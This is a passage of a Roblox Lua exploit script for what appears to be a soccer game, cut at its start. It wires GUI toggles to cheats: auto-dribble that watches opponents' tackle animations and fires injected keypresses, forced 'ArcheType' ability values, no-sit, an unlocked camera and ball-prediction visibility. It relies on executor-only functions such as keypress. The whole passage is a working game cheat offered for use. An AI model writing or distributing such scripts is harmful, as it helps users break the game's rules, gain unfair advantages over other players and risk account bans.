			Toggle_Sprint.Button.MouseButton1Click:Connect(function()
				if Toggle_Sprint.Button.BackgroundTransparency == 0 then
					Toggle_Sprint.Button.BackgroundTransparency = 1
				else
					Toggle_Sprint.Button.BackgroundTransparency = 0
				end
			end)
			local Toggle = false
			local d = true
			local i = nil
			UserInput.InputBegan:Connect(function(Key, isTyping)
				local Humanoid = Player.Character:WaitForChild("Humanoid")
				if not isTyping and not Script_Disabled and Toggle_Sprint.Button.BackgroundTransparency == 0 and Key.UserInputType == Enum.UserInputType.MouseButton2 and UserInput.MouseBehavior == Enum.MouseBehavior.LockCenter then
					if Toggle then
						Toggle = false
						i:Destroy()
						task.wait()
						Humanoid.WalkSpeed = 16
					else
						Toggle = true
						i = Instance.new("StringValue")
						i.Name = "ShiftLock"
						i.Parent = Humanoid
						task.wait()
						Humanoid.WalkSpeed = SprintSpeed
						while Toggle and not Script_Disabled do
							repeat task.wait() until Humanoid.WalkSpeed ~= SprintSpeed or UserInput.MouseBehavior ~= Enum.MouseBehavior.LockCenter or Toggle_Sprint.Button.BackgroundTransparency ~= 0 or Script_Disabled or not Toggle
							if Toggle then
								Toggle = false
								i:Destroy()
								if Humanoid.WalkSpeed ~= 16 then
									Humanoid.WalkSpeed = 16
								end
							end
						end
					end
				end
			end)
			---------------------------------------------------------------------------
			No_Sit.Button.MouseButton1Click:Connect(function()
				if No_Sit.Button.BackgroundTransparency == 0 then
					No_Sit.Button.BackgroundTransparency = 1
				else
					No_Sit.Button.BackgroundTransparency = 0
				end

				while No_Sit.Button.BackgroundTransparency == 0 and not Script_Disabled do
					wait(0.00001)
					if not Script_Disabled then
						Player.Character.Humanoid.Sit = false
						Player.Character.VFX.NoMove.Value = false
					end
				end
			end)
			---------------------------------------------------------------------------
			Unlock_Camera.Button.MouseButton1Click:Connect(function()
				if Unlock_Camera.Button.BackgroundTransparency == 0 then
					Unlock_Camera.Button.BackgroundTransparency = 1
					Player.CameraMaxZoomDistance = 23
				else
					Unlock_Camera.Button.BackgroundTransparency = 0
					Player.CameraMaxZoomDistance = 100
				end
			end)
			---------------------------------------------------------------------------
			Acrobatic.Button.MouseButton1Click:Connect(function()
				if Acrobatic.Button.BackgroundTransparency == 0 then
					Acrobatic.Button.BackgroundTransparency = 1
				else
					Acrobatic.Button.BackgroundTransparency = 0
				end
				
				while Acrobatic.Button.BackgroundTransparency == 0 and not Script_Disabled do
					wait()
					Player.ArcheType3.Value = "Acrobatic"
				end
			end)
			---------------------------------------------------------------------------
			Ball_Awareness.Button.MouseButton1Click:Connect(function()
				if Ball_Awareness.Button.BackgroundTransparency == 0 then
					Ball_Awareness.Button.BackgroundTransparency = 1
				else
					Ball_Awareness.Button.BackgroundTransparency = 0
				end
			end)
			if workspace:FindFirstChild("Ignore") then
				workspace.Ignore.Predict.ChildAdded:Connect(function(p8)
					if Ball_Awareness.Button.BackgroundTransparency == 0 and not Script_Disabled then
						p8.Transparency = 0.6
					end
				end)
			end---------------------------------------------------------------------------
			FormlessShooter.Button.MouseButton1Click:Connect(function()
				if FormlessShooter.Button.BackgroundTransparency == 0 then
					FormlessShooter.Button.BackgroundTransparency = 1
				else
					FormlessShooter.Button.BackgroundTransparency = 0
				end

				while FormlessShooter.Button.BackgroundTransparency == 0 and not Script_Disabled do
					wait()
					Player.ArcheType2.Value = "FormlessShooter"
				end
			end)
			---------------------------------------------------------------------------
			local playerEnteredRadius = {}
			local playersInRadius = {}

			local function onPlayerEnterRadius(otherPlayer)
				table.insert(playersInRadius, otherPlayer)
			end
			local function onPlayerLeaveRadius(otherPlayer)
				table.remove(playersInRadius, table.find(playersInRadius, otherPlayer))
			end
			local function checkRadius()
				if Player.Character:FindFirstChild("Bola") then
					local playersInRadius = {}
					for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
						if otherPlayer ~= Player then
							local distance = (otherPlayer.Character.PrimaryPart.Position - Player.Character.PrimaryPart.Position).Magnitude
							if distance <= SlideTackleRadius then
								playersInRadius[otherPlayer] = true
								if not playerEnteredRadius[otherPlayer] then
									playerEnteredRadius[otherPlayer] = true
									onPlayerEnterRadius(otherPlayer)
								end
							else
								if playerEnteredRadius[otherPlayer] then
									playerEnteredRadius[otherPlayer] = false
									onPlayerLeaveRadius(otherPlayer)
								end
							end
						end
					end
				else
					playerEnteredRadius = {}
					playersInRadius = {}
				end
			end
			local function FindTackleFootAnimation(Op, ID)
				for i, Track in pairs (Op.Humanoid.Animator:GetPlayingAnimationTracks()) do
					if Track.Animation.AnimationId == ID then
						return true
					end
				end
			end
			Auto_Dribble.Button.MouseButton1Click:Connect(function()
				if Auto_Dribble.Button.BackgroundTransparency == 0 then
					Auto_Dribble.Button.BackgroundTransparency = 1
				else
					Auto_Dribble.Button.BackgroundTransparency = 0
				end
				if Auto_Dribble.Button.BackgroundTransparency == 0 then
					local RenderStepped = runService.RenderStepped:Connect(checkRadius)
					while Auto_Dribble.Button.BackgroundTransparency == 0 and not Script_Disabled do
						task.wait()
						local Character = Player.Character
						if Character:FindFirstChild("Bola") then
							local Ball = Player.Character.Bola
							for _, Op in ipairs(playersInRadius) do
								local op = Op.Character
								if not Ball:FindFirstChild(op.Name) and op.Humanoid.Teammate.Value ~= Character.Humanoid.Teammate.Value then
									if op.Humanoid:FindFirstChild("Tackled") or FindTackleFootAnimation(op, "rbxassetid://9015340307") and (op.HumanoidRootPart.Position - Character.HumanoidRootPart.Position).Magnitude < StepTackleRadius then
										if Character.Backpack.DribbleCounter.Value >= 1 then
											keypress(0x46)
											keyrelease(0x46)
											keypress(0x56)
											keyrelease(0x56)
											keypress(0x20)
											keyrelease(0x20)

											local Tag = Instance.new("NumberValue", Ball)
											Tag.Name = op.Name
											Debris:AddItem(Tag, 1.5)
										elseif Jump_Input.Button.BackgroundTransparency == 0 and op.Humanoid:FindFirstChild("Tackled") then
											keypress(0x20)
											keyrelease(0x20)
										end
									end
								end
							end
						end
					end
					RenderStepped:Disconnect()
				end
			end)
			---------------------------------------------------------------------------
			Jump_Input.Button.MouseButton1Click:Connect(function()
				if Jump_Input.Button.BackgroundTransparency == 0 then
					Jump_Input.Button.BackgroundTransparency = 1
				else
					Jump_Input.Button.BackgroundTransparency = 0
				end
			end)
			---------------------------------------------------------------------------
			Show_Step_Radius.Button.MouseButton1Click:Connect(function()
				if Show_Step_Radius.Button.BackgroundTransparency == 0 then

					Show_Step_Radius.Button.BackgroundTransparency = 1
				else
					Show_Step_Radius.Button.BackgroundTransparency = 0
				end
				local Character = Player.Character
				if Show_Step_Radius.Button.BackgroundTransparency == 0 then
					local Cylinder, Weld = Instance.new('Part', Character), Instance.new('Weld', Character.HumanoidRootPart)
					Cylinder.Name = "Radius"
					Cylinder.Shape = Enum.PartType.Cylinder
					Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
					Cylinder.Anchored = false
					Cylinder.CanCollide = false
					Cylinder.Massless = true
					Cylinder.Transparency = 0.7
					Weld.Name = "Radius"
					Weld.Part0 = Weld.Parent
					Weld.Part1 = Cylinder
					Weld.C0 = CFrame.new(0, -3, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1)
					while Show_Step_Radius.Button.BackgroundTransparency == 0 do
						local Character = Player.Character
						Cylinder.Parent = Character
						Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
						Weld.Parent = Character.HumanoidRootPart
						Weld.Part0 = Weld.Parent

						Player.CharacterAppearanceLoaded:Wait()
					end
				else
					if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
					if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
				end
			end)
		end
	end
end
